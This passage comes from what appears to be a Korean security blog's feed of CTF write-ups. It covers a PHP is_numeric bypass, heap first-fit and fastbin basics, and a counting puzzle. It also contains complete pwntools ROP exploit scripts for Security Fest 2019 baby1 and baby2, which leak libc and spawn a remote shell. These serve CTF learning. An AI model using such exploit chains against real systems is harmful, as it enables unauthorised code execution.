src="https://user-images.githubusercontent.com/16969364/58414702-2931a280-80b7-11e9-9653-34ff0e49c802.png"></p><center><small><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">Source</a></strong></p><p></p></small></center><p></p><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-c/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[HackCTF] Time WriteUp</title>
      <link>http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/</link>
      <guid>http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/</guid>
      <pubDate>Sat, 25 May 2019 09:13:01 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;time&quot;&gt;&lt;a class=&quot;markdownIt-Anchor
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="time"><a class="markdownIt-Anchor" href="#time"></a> Time</h3><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367325-e5a13200-7f18-11e9-9eca-cc9f0c363449.PNG"><small><center> [문제] </center></small><br><strong><a href="http://ctf.j0n9hyun.xyz:2032" target="_blank" rel="noopener">문제 링크</a></strong></p><p>문제에서는 is_numeric을 사용하여 숫자를 체크한다.<br>그리고 끝에는 time값을 int로 변환을 해준 뒤 나온 값의 시간이 지나면 플래그를 뱉어낸다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367417-fbfbbd80-7f19-11e9-884b-05ffb7fff365.png"><small><center> [사진 1-1] </center></small></p><p>풀기 위해서는 5184000 ~ 7776000 사이의 값을 넣어야 하는데 단순하게 생각했을 때 해당 시간동안 계속 켜놓으면 된다.<br><br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367419-fdc58100-7f19-11e9-88fd-d66c1258e0c8.PNG" width="718px"><small><center> [사진 1-2] </center></small><br>값이 생각보다 크지 않았다면 말이다…해당 시간을 환산해보면 최소 60일동안 켜놔야 하므로 노답이다.<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="덤으로 전기세도 와장창">[1]</span></a></sup> 그래서 다른 방법을 찾아야 하는데 공식 문서에 is_numeric에 관한 설명이 기재되어 있다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367510-27cb7300-7f1b-11e9-8a21-2e9c49769604.PNG" width="718px"><small><center> [사진 2-1] </center></small><br>설명에는 변수가 임의의 자릿수, 선택적 기호, 소수, 지수로 구성될 수 있다고 한다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367511-28fca000-7f1b-11e9-9808-2c4b0dada0cb.PNG" width="150px"><small><center> [사진 2-2] </center></small><br>마찬가지로 예제에서도 모두 <strong>true</strong>로 통과하는 것을 볼 수 있다. 그렇다는 말은 즉슨, 소수점과 지수 e를 이용하면 위의 취약점을 공략할 수 있다는 소리가 된다. <br>5184000을 지수와 소수점으로 바꿔서 <strong><code>5.184000e6</code></strong> 으로 입력하면 끝에 정수(int) 형변환으로 인해 결국은 소수점 뒤에 자릿수는 모두 사라지게 되어 <strong><code>5초</code></strong> 뒤 플래그를 뱉어낸다.<br><br>원래는 16진수 값도 부분적으로 <strong>true</strong>를 반환했는데 php 7.0.0 버전부터는 16진수도 false로 반환하게끔 패치되었다. 따라서 해당 서버에는 php 7.0.0 이상의 버전을 사용하고 있다는 것도 알 수 있다.<br><br></p><p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58367835-e63cc700-7f1e-11e9-9774-f085a36875bf.PNG"><small><center> [FLAG] </center></small></p><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">덤으로 전기세도 와장창<a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/25/HackCTF-Time-WriteUp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Heap Thoery] First Fit</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/</guid>
      <pubDate>Fri, 24 May 2019 05:51:30 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;first-fit&quot;&gt;&lt;a class=&quot;markdownIt-A
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="first-fit"><a class="markdownIt-Anchor" href="#first-fit"></a> First Fit</h2><p>Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다.<br>그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다.</p><p>다음의 예제를 한번 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">300</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(300) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(250) B : %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(250) A : %p\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center> [Example.c] </center><p><strong>3줄 요약</strong></p><ol><li><strong>a</strong>와 <strong>b</strong>에 각각 <code>malloc</code><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="동적할당">[1]</span></a></sup>을 요청한다.</li><li><strong>a</strong>를 <code>free</code><sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="할당해제">[2]</span></a></sup>한다.</li><li><strong>a</strong>에 다시 <code>malloc</code><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="동적할당">[1]</span></a></sup>을 요청한다.</li></ol><p>a에 300, b에 250 바이트가 동적 할당 되었다. 둘은 서로 다른 크기를 가지고 있는데<br>a를 free 해준 뒤 다시 재할당을 해주면 어떻게 될까?<br><br></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png"><center> [실행 결과] </center>서로 다른 크기로 할당했지만 결과는 이전과 동일한 주소를 가리키게 된다.<br>그렇다면 남은 50 바이트는 그대로 증발되느냐? 아니다. 남은 50바이트도 여전히 남아있다.대신 a 청크가 두 개로 분리된다(300바이트 작을 경우). a1, a2 이런 식으로 말이다.<center><table><thead><tr><th style="text-align:center">head</th></tr></thead><tbody><tr><td style="text-align:center">a1[250]</td></tr><tr><td style="text-align:center">a2[50]</td></tr><tr><td style="text-align:center"><strong>tail</strong></td></tr></tbody></table><h3 id="malloc250-재할당-후"><a class="markdownIt-Anchor" href="#malloc250-재할당-후"></a> ↓ malloc(250) 재할당 후</h3><table><thead><tr><th style="text-align:center">head</th></tr></thead><tbody><tr><td style="text-align:center">a2 (a1값 반환됨)</td></tr><tr><td style="text-align:center"><strong>tail</strong></td></tr></tbody></table></center><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(c);</span><br><span class="line"><span class="built_in">free</span>(d);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc B-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc C-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free malloc D-------"</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) A-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) B-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) C-------"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------malloc(100) D-------"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center> <caption> [Example2.c] </caption> </center>다음은 fastbin 예제이다. fastbin은 단일 연결 리스트<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="Singly Linked list">[3]</span></a></sup>라서 메모리 할당 및 해제 속도가 빠르며 LIFO 구조를 지니고 있다.아래의 과정을 확인해보면 알 수 있다.<p><code>head - a - tail</code> <strong>free⒜</strong><br><code>head - b - a - tail</code><strong>free⒝</strong><br><code>head - c - b - a - tail</code> <strong>free⒞</strong><br><code>head - d - c - b - a - tail</code> <strong>free⒟</strong><br><code>head - c - b - a - tail</code> <strong>malloc⒜</strong><br><code>head - b - a - tail</code> <strong>malloc⒝</strong><br><code>head - a - tail</code> <strong>malloc⒞</strong><br><code>head - tail</code> <strong>malloc⒟</strong></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58298844-fd44c180-7e17-11e9-97cc-e8d39f0a619d.PNG"><center> [실행 결과] </center> <br><center> <h5 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> <a href="https://heap-exploitation.dhavalkapil.com/attacks/first_fit.html" target="_blank" rel="noopener">Reference</a></h5></center><style>  img.border-shadow{          border:1px solid #888888;          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);      }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">동적할당<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">할당해제<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">Singly Linked list<a href="#fnref:3" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Security Fest 2019 baby2</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/</guid>
      <pubDate>Fri, 24 May 2019 00:03:43 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;baby2&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3><p><code>기본 ROP 문제</code></p><p>우분투 18.04 환경에서는  main으로 안 돌아가는 경우도 있는 것 같다. <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="내부 인스트럭션에서 조금 차이가 있는 듯하다. [참고](https://kong.re.kr/?p=335)">[1]</span></a></sup> <small> (일단 난 잘됨) </small></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./baby2')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10002</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">main = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">pr = <span class="number">0x0000000000400783</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(puts_got)</span><br><span class="line">p += p64(puts_plt)</span><br><span class="line">p += p64(main) </span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaked)</span><br><span class="line">libc_base = leaked - puts_offset</span><br><span class="line">one_shot = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p = <span class="string">""</span></span><br><span class="line">p += <span class="string">"\x90"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(one_shot)</span><br><span class="line">sla(<span class="string">'input: '</span>, p)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58294548-a46c2d80-7e05-11e9-8941-275e6762359b.PNG"><center><small>[Remote]</small></center> <br><style>  img.border-shadow{        border:1px solid #888888;        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);    }</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">내부 인스트럭션에서 조금 차이가 있는 듯하다. <a href="https://kong.re.kr/?p=335" target="_blank" rel="noopener">참고</a><a href="#fnref:1" rev="footnote"> ↩</a></span></li></ol></div></div>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Security Fest 2019 baby1</title>
      <link>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/</link>
      <guid>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/</guid>
      <pubDate>Fri, 24 May 2019 00:01:52 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;baby2&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./baby1')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10001</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>)</span><br><span class="line">binsh = e.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">pr = <span class="number">0x0000000000400793</span> <span class="comment"># pop rdi; ret </span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">p = <span class="string">"A"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(binsh)</span><br><span class="line">p += p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line">sl(p)</span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">ex();</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>ALLMN CTF 2019 Doesn&#39;t contain K integer</title>
      <link>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/</link>
      <guid>http://j0n9hyun.github.io/2019/05/05/doesnt_contain_k_integer/</guid>
      <pubDate>Sat, 04 May 2019 17:06:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;doesnt-contain-k-integer&quot;&gt;&lt;a clas
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="doesnt-contain-k-integer"><a class="markdownIt-Anchor" href="#doesnt-contain-k-integer"></a> Doesn’t contain K integer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">How many numbers from 1 to N that don&apos;t contain K number. Input: N (integer number) and space K (integer number).  </span><br><span class="line">Output: The total number. Example if N is 30 and K is 3 there are 27 numbers that don&apos;t contain number 3.  </span><br><span class="line">So the flag will be ALLMN&#123;total number&#125;</span><br></pre></td></tr></table></figure><center><small>[문제 내용]</small></center><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">281939942</span></span><br><span class="line">k = <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'3'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"total is "</span> + str(n)</span><br></pre></td></tr></table></figure><center><small>[Python]</small></center><p>파이썬으로 짜면 금방인 문제. 하지만 간단하면서도 간단하지 않다. 계산하는 수가 매우 높아서 소요 시간이 개노답이기 때문이다. 그래서 결국 c로 다시 뚝딱했다.<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="C와 Python의 연산 속도는 약 100배가량  차이가  난다.">[1]</span></a></sup> c로도 약 2시간 30분이 소요 됐다. (더 빠른 알고리즘이 있겠지만 아몰랑) <br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num_start = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> num_end = <span class="number">281939942</span>;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> digit = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">digit %= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (num = num_start; num &lt;= num_end; num++) &#123;</span><br><span class="line"><span class="keyword">int</span> temp_num = num;</span><br><span class="line"><span class="keyword">int</span> have = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (digit == <span class="number">0</span>) &#123;</span><br><span class="line">have = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (temp_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp_num % <span class="number">10</span> == digit) &#123;</span><br><span class="line">have = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp_num /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (have == <span class="number">1</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\ncount : %d\n"</span>, num_end-count+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center><small>[C]</small></center><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58037160-c3e62a80-7b67-11e9-9c1e-41ef1aac964a.png"><center><small>[Run]</small></center><style>  img.border-shadow{    border:1px solid #888888;    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);}</style><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: 